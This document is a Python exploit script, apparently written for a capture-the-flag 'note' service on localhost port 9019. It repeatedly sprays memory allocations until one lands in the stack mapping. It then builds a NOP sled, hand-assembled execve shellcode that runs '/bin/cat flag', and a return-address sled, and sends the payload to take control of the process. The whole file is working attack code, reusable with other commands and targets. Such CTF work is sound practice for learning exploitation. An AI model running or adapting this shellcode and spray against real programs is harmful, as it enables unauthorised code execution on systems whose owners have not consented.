import socket
import re
import sys
import os
import fcntl
import struct
import binascii
import select

NOTENO_REGEX = re.compile('^.*created. no (\d{1,3}).*$', re.IGNORECASE)
ADDRESS_REGEX = re.compile('^.*\[([A-Fa-f0-9]{8})\].*$', re.IGNORECASE)

IMPORTANT_MAPPINGS = [
  [0x8048000, 0x804a000, "/home/note/note"],
  [0x804a000, 0x804b000, "/home/note/note"],
  [0x804b000, 0x804c000, "/home/note/note"],

  [0xf7e17000, 0xf7fc4000, "/lib32/libc-2.23.so"],
  [0xf7fc4000, 0xf7fc6000, "/lib32/libc-2.23.so"],
  [0xf7fc6000, 0xf7fc7000, "/lib32/libc-2.23.so"],

  [0xf7fd9000, 0xf7ffb000, "/lib32/ld-2.23.so"],
  [0xf7ffc000, 0xf7ffd000, "/lib32/ld-2.23.so"],
  [0xf7ffd000, 0xf7ffe000, "/lib32/ld-2.23.so"],

  [0xfffdd000, 0xffffe000, "[stack]"]
]

def build_nop_sled(size):
  return ('\x90' * size)

def build_execve_shellcode(address, command, args):
  SHELLCODE =  "\x31\xC0"             # xor eax, eax
  SHELLCODE += "\xBA\xDD\xBE\x75\xCA" # mov edx, 0xca75bedd     char *const envp[]
  SHELLCODE += "\xB9\x0D\xF0\xAD\xBA" # mov ecx, 0xbaadf00d     char *const argv[]
  SHELLCODE += "\xBB\xEF\xBE\xAD\xDE" # mov ebx, 0xdeadbeef     const char *filename
  SHELLCODE += "\xB0\x0B"             # mov al, 0xb             execve syscall id
  SHELLCODE += "\xCD\x80"             # int 0x80                call execve
  # push the initial shellcode
  shell = SHELLCODE
  # push the command string
  adrCommand = len(shell) + address
  shell += command + "\x00"
  # push the argument strings
  adrArgs = []
  for arg in args:
    adrArg = len(shell) + address
    shell += arg + "\x00"
    adrArgs.append(adrArg)
  # align with 0x00 bytes
  shell += ('\x00' * (4 - (len(shell) % 4)))
  # build an array of pointers to the arguments (lead with the command)
  adrArgArray = len(shell) + address
  shell += struct.pack("<I", adrCommand)
  for argp in adrArgs:
    shell += struct.pack("<I", argp)
  # terminate the array with 0x00000000
  adrArgArrayTerminator = len(shell) + address
  shell += struct.pack("<I", 0)
  # point filename at the command
  shell = shell.replace("\xEF\xBE\xAD\xDE", struct.pack("<I", adrCommand))
  # point argv at the pointer array
  shell = shell.replace("\x0D\xF0\xAD\xBA", struct.pack("<I", adrArgArray))
  # point envp at the array terminator, since we want it as a null array
  shell = shell.replace("\xDD\xBE\x75\xCA", struct.pack("<I", adrArgArrayTerminator))
  # trail with nops to align the shellcode
  shell += ('\x90' * (4 - (len(shell) % 4)))
  return shell

def build_rop_sled(target, size, offset):
  # calculate amount of space, then subtract 1 incase of a rounding issue
  #   (don't want to run beyond the stack and get a segfault)
  ropsize = ((size - offset) / 4) - 1
  rop = struct.pack("<I", target)
  return (rop * ropsize)

SOCK_BUFF = ""
def read_line(sock):
  global SOCK_BUFF

  if ('\n' in SOCK_BUFF):
    line, SOCK_BUFF = SOCK_BUFF.split('\n', 1)
    return line

  while True:
    rr, rw, e = select.select([sock,], [sock,], [sock], 1)
    if (len(rr)):
      data = sock.recv(4096)
      if (data == ""):
        if (SOCK_BUFF != ""):
          return SOCK_BUFF
        raise Exception()
      SOCK_BUFF += data
    else:
      break

  if ('\n' in SOCK_BUFF):
    line, SOCK_BUFF = SOCK_BUFF.split('\n', 1)
    return line
  return ""

def read_lines_until(sock, expected, display=False):
  while True:
    line = read_line(sock)
    if (display and line != ""):
      print(line)
    if (expected in line):
      break

def read_line_nonnull(sock):
  line = ""
  while line == "":
    line = read_line(sock)
  return line




GOTFLAG = False
TRIES = 0
TOTAL_ALLOCATIONS = 0
SHELLCODE_ATTEMPTS = 0
while True:
  try:
    TRIES += 1
    print("Starting mmap_s() spray #%d..." % TRIES)
    SOCK_BUFF = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 9019))
    important_notes = []

    read_lines_until(s, "exit", False)
    while True:
      # allocate as many blocks as we can at once
      blockCount = (256 - len(important_notes))
      s.send("1\n" * blockCount)
      TOTAL_ALLOCATIONS += blockCount

      # spin over the results and see what we've got
      for b in range(1, blockCount):
        read_lines_until(s, "exit", False)

        line1 = read_line_nonnull(s)
        line2 = read_line_nonnull(s)
        no = int(NOTENO_REGEX.match(line1).group(1))
        adr = int(ADDRESS_REGEX.match(line2).group(1), 16)

        for imap in IMPORTANT_MAPPINGS:
          if (adr >= imap[0] and adr < imap[1]):
            important_notes.append(no)
            offset = adr - imap[0]
            print("  Landed note %d in important map (%s, offs: 0x%04x, adr: 0x%08x)" % (no, imap[2], offset, adr))
            if (imap[2] == "[stack]"):
              SHELLCODE_ATTEMPTS += 1
              # lead with some nops to leave stack scratch space for the shellcode to work
              shell = build_nop_sled(100)
              shell += build_execve_shellcode(adr + len(shell), "/bin/cat", ["flag"])
              #print(binascii.hexlify(b"%s" % shell))
              shell += build_rop_sled(adr, imap[1] - imap[0], len(shell) + offset)

              # clear the socket buffer since we won't care about anything else at this point
              SOCK_BUFF = ""
              # launch the attack
              print("  Hit the stack! Attempting shellcode.")
              s.send(b"2\n%d\n%s\n5\n\n" % (no, shell))

              # filter through the output for the flag
              knownSubs = ["e note", "d note", "exit", " no?", "bye", "(MAX", "- Select"]
              while True:
                line = read_line(s)
                cont = (line == "")
                for a in knownSubs:
                  if (a in line):
                    cont = True
                    break
                if (cont):
                  continue
                GOTFLAG = True
                print("FLAG: %s" % line)
            break

      # clear out any blocks we don't need and start again
      todel = []
      for i in range(0, 256):
        if (i not in important_notes):
          todel.append(i)
      s.send(''.join("4\n%d\n" % x for x in todel))

      # make sure to read all of the output
      for d in todel:
        read_lines_until(s, "exit", False)
      read_lines_until(s, "exit", False)
  except:
    print("Looks like the target crashed, restarting...")
    print("  Number of Crashes: %d" % TRIES)
    print("  Total Allocations: %d" % TOTAL_ALLOCATIONS)
    print("  Shellcode Attempts: %d" % SHELLCODE_ATTEMPTS)
    if (GOTFLAG):
      raw_input("We might have a flag, check the console.")
      GOTFLAG = False
